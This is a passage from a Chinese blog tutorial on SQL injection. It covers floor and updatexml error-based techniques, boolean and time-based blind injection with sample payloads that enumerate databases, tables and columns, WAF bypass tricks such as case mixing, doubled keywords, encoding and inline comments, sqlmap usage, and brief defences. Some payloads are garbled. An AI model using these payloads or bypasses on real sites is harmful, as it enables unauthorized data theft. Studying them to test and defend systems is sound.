<p>继续进行group by。这是第四次floor运算了,根据刚刚那个011011序列，这次的值为0，在表中找是否有key为0的数据。当然没有，故应当插入一条新记录。在插入时进行floor运算(就像第一次group by那样)，这时的值为1,并将count(*)置1。可是你会说，虚拟表中已经有了key为1的数据了啊。对，这就是问题所在了。此时就会抛出主键冗余的异常，也就是所谓的floor报错。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:/Users/Administrator/Desktop/Floor9.png"></p>
<h2 id="十五种报错函数"><a href="#十五种报错函数" class="headerlink" title="十五种报错函数"></a>十五种报错函数</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:/Users/Administrator/Desktop/%25E5%258D%2581%25E4%25BA%2594%25E7%25A7%258D%25E6%258A%25A5%25E9%2594%2599%25E5%2587%25BD%25E6%2595%25B0.png"></p>
<p>强烈建议:<br>在concat查询语句后面添加一个标识符，如0x23</p>
<p>updatexml(1,concat(0x23,payload,0x23),1)</p>
<p>因为有的时候报错信息会设置长度限制，添加标识符可以避免显示不完全</p>
<h2 id="布尔型盲注"><a href="#布尔型盲注" class="headerlink" title="布尔型盲注"></a>布尔型盲注</h2><p>特点:页面存在异常，但是即无回显也无报错信息</p>
<p>利用:只能通过正确与错误两种状态来判断payload是否正确，</p>
<p>count()</p>
<p>计算结果集的行数。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:/Users/Administrator/Desktop/%25E5%25B8%2583%25E5%25B0%2594%25E5%259E%258B%25E7%259B%25B2%25E6%25B3%25A8.png"></p>
<p>length(str)</p>
<p>返回指定字符串的长度</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:/Users/Administrator/Desktop/length(str).png"></p>
<p>Ps:length里面放一个字符串，如果放置表达式的话，需要用括号括起来</p>
<p>substr(str,pos,len)&#x2F;substring(str,pos,len)<br>返回截取的子字符串。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:/Users/Administrator/Desktop/substr.png"></p>
<p>ascii(str)<br>返回指定字符串最左侧字符的ascii值.</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:/Users/Administrator/Desktop/ascii.png"></p>
<p>布尔型盲注核心思想：</p>
<p>利用判断语句来证明推测是否正确。</p>
<p>推测正确时，页面正常显示:错误时，页面异常。</p>
<h2 id="盲注一般步骤"><a href="#盲注一般步骤" class="headerlink" title="盲注一般步骤"></a>盲注一般步骤</h2><ol>
<li>求闭合字符</li>
<li>求当前数据库名的长度</li>
<li>求当前数据库名对应的ascii值</li>
<li>求表的数量</li>
<li>求表名的长度</li>
<li>求表名对应的ascii值</li>
<li>求列的数量</li>
<li>求列名的长度</li>
<li>求列名对应的ascii值</li>
<li>求字段的数量</li>
<li>求字段内容的长度</li>
<li>求字段内容对应的ascii值</li>
</ol>
<h2 id="求数据库长度"><a href="#求数据库长度" class="headerlink" title="求数据库长度"></a>求数据库长度</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:/Users/Administrator/Desktop/%25E6%25B1%2582%25E6%2595%25B0%25E6%258D%25AE%25E5%25BA%2593%25E9%2595%25BF%25E5%25BA%25A6.png"></p>
<blockquote>
<p>?id&#x3D;1’and length(database())&#x3D;8 %23</p>
</blockquote>
<h2 id="求数据库名的ascii值"><a href="#求数据库名的ascii值" class="headerlink" title="求数据库名的ascii值"></a>求数据库名的ascii值</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:/Users/Administrator/Desktop/%25E6%25B1%2582%25E6%2595%25B0%25E6%258D%25AE%25E5%25BA%2593%25E5%2590%258D%25E7%259A%2584ascii%25E5%2580%25BC.png"></p>
<blockquote>
<p>?id&#x3D;1’and ascii(substr(database(),1,1))&#x3D;115 %23</p>
</blockquote>
<h2 id="求表的数量"><a href="#求表的数量" class="headerlink" title="求表的数量"></a>求表的数量</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:/Users/Administrator/Desktop/%25E6%25B1%2582%25E8%25A1%25A8%25E7%259A%2584%25E6%2595%25B0%25E9%2587%258F.png"></p>
<blockquote>
<p>id&#x3D;1’and (select count(table name,from information schema.tables where table_schema&#x3D;’security’)&#x3D; 4 %23</p>
</blockquote>
<h2 id="求表名的长度"><a href="#求表名的长度" class="headerlink" title="求表名的长度"></a>求表名的长度</h2><h2 id="求表名的ascii值"><a href="#求表名的ascii值" class="headerlink" title="求表名的ascii值"></a>求表名的ascii值</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:/Users/Administrator/Desktop/%25E6%25B1%2582%25E8%25A1%25A8%25E5%2590%258D%25E7%259A%2584ascii%25E5%2580%25BC.png"></p>
<blockquote>
<p>id&#x3D;1’and ascii(substr((select table_name from information, schema.tables where table_schema&#x3D;’security’ limit 0,1),1,1))&#x3D;101 %23</p>
</blockquote>
<h2 id="求列的数量"><a href="#求列的数量" class="headerlink" title="求列的数量"></a>求列的数量</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:/Users/Administrator/Desktop/%25E6%25B1%2582%25E5%2588%2597%25E7%259A%2584%25E6%2595%25B0%25E9%2587%258F.png"></p>
<blockquote>
<p>id&#x3D;1’and (select count(column_name) from information_schema.columns where table_schema&#x3D;’security’ and table_name&#x3D;’users’)&#x3D;3 %23</p>
</blockquote>
<h2 id="求列名的长度"><a href="#求列名的长度" class="headerlink" title="求列名的长度"></a>求列名的长度</h2><h2 id="求列名对应的ascii值"><a href="#求列名对应的ascii值" class="headerlink" title="求列名对应的ascii值"></a>求列名对应的ascii值</h2><h2 id="求字段的数量"><a href="#求字段的数量" class="headerlink" title="求字段的数量"></a>求字段的数量</h2><h2 id="求字段内容的长度"><a href="#求字段内容的长度" class="headerlink" title="求字段内容的长度"></a>求字段内容的长度</h2><h2 id="求字段内容对应的ascii值"><a href="#求字段内容对应的ascii值" class="headerlink" title="求字段内容对应的ascii值"></a>求字段内容对应的ascii值</h2><h2 id="时间型盲注"><a href="#时间型盲注" class="headerlink" title="时间型盲注"></a>时间型盲注</h2><p>特点:页面不存在异常，且即无回显也无报错信息</p>
<p>利用:只能利用条件语句结合执行时间的长短来判断payload是否正确</p>
<p>if(exp1,exp2,exp3)</p>
<p>如果exp1是True，则执行exp2，否则执行exp3</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:/Users/Administrator/Desktop/if(exp1,exp2,exp3).png"></p>
<p>sleep(s)<br>将程序暂停s秒</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:/Users/Administrator/Desktop/sleep.png"></p>
<p>时间型盲注核心思想<br>if(payload,sleep(3),1)<br>即payload正确时，程序暂停3秒。否则立刻执行。<br>if(payload,1,sleep(3))<br>即payload正确时，程序立刻执行，否则暂停3秒</p>
<h2 id="WAF绕过之道"><a href="#WAF绕过之道" class="headerlink" title="WAF绕过之道"></a>WAF绕过之道</h2><p>常见姿势</p>
<ol>
<li>大小写混合</li>
<li>多重关键字</li>
<li>编码</li>
<li>注释</li>
<li>等价函数或命令</li>
<li>特殊符号</li>
<li>组合绕过</li>
</ol>
<p>1.大小写混合</p>
<p>原因:服务器端检测时未开启大小写不敏感</p>
<p>形式:Unlon SeLecT</p>
<p>2.多重关键字</p>
<p>原因:服务器端检测到敏感字符时替换为空</p>
<p>形式:ununionion selselectect</p>
<p>3.编码<br>原因:服务器端未检测或检测不严具有编码形式的关键字</p>
<p>类型:十六进制编码、URL编码、Unicode编码</p>
<p>形式:0x61646d696e、%20、%u0020</p>
<p>4.注释<br>原因:服务器端未检测或检测不严注释内的字符串</p>
<p>形式:&#x2F;**&#x2F;，&#x2F;*!*&#x2F;，&#x2F;*!12345*&#x2F;，#，—等</p>
<p>5.等价函数或命令<br>原因:服务器端黑名单不完整，过滤不严</p>
<p>形式:<br>Mysql查询:Union distinct、updatexml、Extractvalue、floor</p>
<p>字符串截取函数:mid、substr、substring、left、reverse</p>
<p>字符串连接函数:concat、group_concat、concat_ws</p>
<p>字符串转换:char、hex、unhex</p>
<p>替换逗号:limit 1offset0，mid(version() from 1 for 1)</p>
<p>替换等号:like</p>
<p>6.特殊符号<br>原因:数据库中效果相同，服务器端却没有限制</p>
<p>形式:<br>科学记数法 and 1e0&#x3D;1e0</p>
<p>空白字符 %0a %a0 %ob %20 %09</p>
<p>反单引号’table_name’</p>
<p>括号 select*from (test.admin)</p>
<p>7.组合绕过<br>原因:服务器端检测多处位置，需要多重绕过方式组合使用</p>
<p>形式:id&#x3D;1 and&#x2F;**&#x2F;‘1’like’2’&#x2F;**&#x2F;&#x2F;*!12345union*&#x2F;select 1,2,3</p>
<h1 id="D-SQL注入工具使用"><a href="#D-SQL注入工具使用" class="headerlink" title="D.SQL注入工具使用"></a>D.SQL注入工具使用</h1><p>Sqlmap</p>
<p>Pangolin(穿山甲)</p>
<p>啊D</p>
<p>Havij(胡萝卜)</p>
<p>Sqlmap常用命令<br>Python sqlmap.py -h      显示基体帮助信息</p>
<p>Python sqlmap.py-hh     显示高级帮助信息</p>
<p>检测诗人存在注入：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:/Users/Administrator/Desktop/%25E6%25A3%2580%25E6%25B5%258B%25E6%2598%25AF%25E5%2590%25A6%25E5%25AD%2598%25E5%259C%25A8%25E6%25B3%25A8%25E5%2585%25A5.png"></p>
<p>求所有数据库</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:/Users/Administrator/Desktop/%25E6%25B1%2582%25E6%2589%2580%25E6%259C%2589%25E6%2595%25B0%25E6%258D%25AE%25E5%25BA%2593.png"></p>
<p>求当前数据库</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:/Users/Administrator/Desktop/%25E6%25B1%2582%25E5%25BD%2593%25E5%2589%258D%25E6%2595%25B0%25E6%258D%25AE%25E5%25BA%2593.png"></p>
<p>求指定数据库所有表名</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:/Users/Administrator/Desktop/%25E6%25B1%2582%25E6%258C%2587%25E5%25AE%259A%25E6%2595%25B0%25E6%258D%25AE%25E5%25BA%2593%25E6%2589%2580%25E6%259C%2589%25E8%25A1%25A8%25E5%2590%258D.png"></p>
<p>求指定数据库指定表的所有列名</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:/Users/Administrator/Desktop/%25E6%25B1%2582%25E6%258C%2587%25E5%25AE%259A%25E6%2595%25B0%25E6%258D%25AE%25E5%25BA%2593%25E6%258C%2587%25E5%25AE%259A%25E8%25A1%25A8%25E7%259A%2584%25E6%2589%2580%25E6%259C%2589%25E5%2588%2597%25E5%2590%258D.png"></p>
<p>求指定数据库指定表名指定字段的内容</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:/Users/Administrator/Desktop/%25E6%25B1%2582%25E6%258C%2587%25E5%25AE%259A%25E6%2595%25B0%25E6%258D%25AE%25E5%25BA%2593%25E6%258C%2587%25E5%25AE%259A%25E8%25A1%25A8%25E5%2590%258D%25E6%258C%2587%25E5%25AE%259A%25E5%25AD%2597%25E6%25AE%25B5%25E7%259A%2584%25E5%2586%2585%25E5%25AE%25B9.png"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:/Users/Administrator/Desktop/%25E6%25B1%2582%25E6%258C%2587%25E5%25AE%259A%25E6%2595%25B0%25E6%258D%25AE%25E5%25BA%2593%25E6%258C%2587%25E5%25AE%259A%25E8%25A1%25A8%25E5%2590%258D%25E6%258C%2587%25E5%25AE%259A%25E5%25AD%2597%25E6%25AE%25B5%25E7%259A%2584%25E5%2586%2585%25E5%25AE%25B92.png"></p>
<h1 id="E-SQL注入防御措施"><a href="#E-SQL注入防御措施" class="headerlink" title="E.SQL注入防御措施"></a>E.SQL注入防御措施</h1><p>使用参数化查询</p>
<p>输入检查</p>
<p>1.白名单检查</p>
<p>判断参数数据类型。如id的值，判断是否为整形</p>
<p>2.黑名单检查</p>
<p>使用正则禁止敏感字符和字符串的使用</p>
<p>使用安全函数</p>
<p>最小权限原则</p>
</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">渊</div><div class="post-copyright__author_desc">乖乖，我永远希望你能开心</div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://example.com/2024/04/23/hw/SQL%E6%B3%A8%E5%85%A5/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://example.com/2024/04/23/hw/SQL注入/')">SQL注入</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"><div class="post-reward" onclick="anzhiyu.addRewardMask()"><div class="reward-button button--animated" title="赞赏作者"><i class="anzhiyufont anzhiyu-icon-hand-heart-fill"></i>打赏作者</div><div class="reward-main"><div class="reward-all"><span class="reward-title">感谢你赐予我前进的力量</span><ul class="reward-group"><li class="reward-item"><a href="/img/reward/wx.jpg" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/reward/wx.jpg" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="/img/reward/zfb.jpg" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/reward/zfb.jpg" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul><a class="reward-main-btn" href="/about/#about-reward" target="_blank"><div class="reward-text">赞赏者名单</div><div class="reward-dec">因为你们的支持让我意识到写文章的价值🙏</div></a></div></div></div><div id="quit-box" onclick="anzhiyu.removeRewardMask()" style="display: none"></div><div class="reward-link mode"><a class="reward-link-button" href="/wechat/"><i class="anzhiyufont anzhiyu-icon-plant-fill"></i>运营模式与责任</a></div></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="http://example.com/2024/04/23/hw/SQL%E6%B3%A8%E5%85%A5/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=SQL注入&amp;url=http://example.com/2024/04/23/hw/SQL%E6%B3%A8%E5%85%A5/&amp;pic=/img/default_cover.jpg" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
  var currentPageUrl = window.location.href;
  var input = document.createElement("input");
  input.setAttribute("value", currentPageUrl);
  document.body.appendChild(input);
  input.select();
  input.setSelectionRange(0, 99999);
  document.execCommand("copy");
  document.body.removeChild(input);
}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">渊</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"></div></div><div class="post_share"><div class="social-share" data-image="/img/default_cover.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/04/06/%E5%8E%9F%E7%A0%81%E3%80%81%E5%8F%8D%E7%A0%81%E3%80%81%E8%A1%A5%E7%A0%81%20%E8%AF%A6%E8%A7%A3%EF%BC%81/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/default_cover.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">原码、反码、补码 详解！</div></div></a></div><div class="next-post pull-right"><a href="/2024/04/23/hw/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%EF%BC%88XSS%EF%BC%89/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/default_cover.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">跨站脚本攻击（XSS）</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/08/24/64e6ce9c507bb.png" alt="status"/></div></div><div class="author-info__description">落魄谷中寒风吹,春秋蝉鸣少年归 荡魂山处石人泪,定仙游走魔向北 逆流河上万仙退,爱情不敌坚持泪 宿命天成命中败,仙尊悔而我不悔</div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/"><h1 class="author-info__name">渊</h1><div class="author-info__desc">乖乖，我永远希望你能开心</div></a><div class="card-info-social-icons is-center"><a class="social-icon faa-parent animated-hover" href="https://github.com/updateyuan" target="_blank" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a><a class="social-icon faa-parent animated-hover" href="https://space.bilibili.com/1807133884" target="_blank" title="BiliBili"><i class="anzhiyufont anzhiyu-icon-bilibili"></i></a></div></div></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bullhorn anzhiyu-shake"></i><span>公告</span></div><div class="announcement_content">天若有情天亦老,大道无情情至公</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#A-SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">A.SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E5%8D%B1%E5%AE%B3%E4%BB%A5%E5%8F%8A%E6%9C%AC%E8%B4%A8%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">SQL注入危害以及本质：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%88%86%E7%B1%BB"><span class="toc-number">1.2.</span> <span class="toc-text">SQL注入的分类</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E4%B8%80%E8%88%AC%E6%AD%A5%E9%AA%A4"><span class="toc-number">1.3.</span> <span class="toc-text">SQL注入的一般步骤</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#B-MySQL%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E7%89%88"><span class="toc-number">2.</span> <span class="toc-text">B.MySQL之SQL注入版</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#MySQL%E4%B8%AD%E7%9A%84%E4%B8%89%E7%A7%8D%E6%B3%A8%E9%87%8A%E9%A3%8E%E6%A0%BC%EF%BC%9A"><span class="toc-number">2.1.</span> <span class="toc-text">MySQL中的三种注释风格：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MySQL%E4%B8%AD%E7%9A%84%E5%86%85%E8%81%94%E6%B3%A8%E9%87%8A%EF%BC%9A"><span class="toc-number">2.2.</span> <span class="toc-text">MySQL中的内联注释：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#union%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2"><span class="toc-number">2.3.</span> <span class="toc-text">union联合查询</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#order-by%E8%AF%AD%E5%8F%A5"><span class="toc-number">2.4.</span> <span class="toc-text">order by语句</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#information-schema%E7%9A%84%E7%BB%93%E6%9E%84"><span class="toc-number">2.5.</span> <span class="toc-text">information_schema的结构</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E9%87%8A%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8%EF%BC%9A"><span class="toc-number">2.6.</span> <span class="toc-text">注释在SQL注入中的应用：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E4%B8%AD%E4%B8%80%E4%BA%9B%E5%B8%B8%E7%94%A8%E7%9A%84MySQL%E5%87%BD%E6%95%B0-%E8%AF%AD%E5%8F%A5%EF%BC%9A"><span class="toc-number">2.7.</span> <span class="toc-text">SQL注入中一些常用的MySQL函数&#x2F;语句：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E8%AF%BB%E5%86%99%E6%96%87%E4%BB%B6%E7%9A%84%E6%A0%B9%E6%9C%AC%E6%9D%A1%E4%BB%B6%EF%BC%9A"><span class="toc-number">2.8.</span> <span class="toc-text">SQL注入读写文件的根本条件：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#load-file-%E8%AF%BB%E6%96%87%E4%BB%B6-into-outfile-into-dumpfile%E5%86%99%E6%96%87%E4%BB%B6"><span class="toc-number">2.9.</span> <span class="toc-text">load file()读文件        into outfile &#x2F;into dumpfile写文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9E%E6%8E%A5%E5%87%BD%E6%95%B0"><span class="toc-number">2.10.</span> <span class="toc-text">字符串连接函数</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#C-SQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%88%98%E6%BC%94%E7%BB%83"><span class="toc-number">3.</span> <span class="toc-text">C.SQL注入实战演练</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E7%9A%84%E6%B3%A8%E5%85%A5%E6%A8%A1%E5%BC%8F"><span class="toc-number">3.1.</span> <span class="toc-text">基于联合查询的注入模式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%B1%82%E9%97%AD%E5%90%88%E5%AD%97%E6%AE%B5"><span class="toc-number">3.2.</span> <span class="toc-text">判断是否存在注入与求闭合字段</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B1%82%E6%98%BE%E7%A4%BA%E4%BD%8D"><span class="toc-number">3.3.</span> <span class="toc-text">求显示位</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B1%82%E8%A1%A8%E5%90%8D"><span class="toc-number">3.4.</span> <span class="toc-text">求表名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B1%82%E5%88%97%E5%90%8D"><span class="toc-number">3.5.</span> <span class="toc-text">求列名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B1%82%E5%AD%97%E6%AE%B5%E5%86%85%E5%AE%B9"><span class="toc-number">3.6.</span> <span class="toc-text">求字段内容</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E6%8A%A5%E9%94%99%E7%9A%84%E6%B3%A8%E5%85%A5%E6%A8%A1%E5%BC%8F"><span class="toc-number">3.7.</span> <span class="toc-text">基于报错的注入模式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#updatexml%E5%87%BD%E6%95%B0"><span class="toc-number">3.8.</span> <span class="toc-text">updatexml函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B1%82%E5%BA%93%E5%90%8D"><span class="toc-number">3.9.</span> <span class="toc-text">求库名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B1%82%E8%A1%A8%E5%90%8D-1"><span class="toc-number">3.10.</span> <span class="toc-text">求表名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B1%82%E5%88%97%E5%90%8D-1"><span class="toc-number">3.11.</span> <span class="toc-text">求列名</span></a></li><li class="toc-item 